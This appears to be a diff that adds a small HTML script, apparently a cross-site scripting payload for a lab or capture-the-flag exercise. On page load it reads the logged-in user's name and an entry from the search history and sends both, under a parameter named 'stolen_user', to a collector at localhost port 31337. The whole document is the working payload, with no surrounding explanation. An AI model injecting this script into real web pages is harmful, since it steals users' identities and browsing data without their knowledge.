@@ -1,0 +1,7 @@
+<script>
+window.onload = function() { 
+	let user = document.getElementById('logged-in-user').innerText;
+	let last_search = document.getElementById('history-list').children[1].innerText;
+	fetch(`http://localhost:31337/?stolen_user=${user}&last_search=${last_search}`);
+};
+</script>
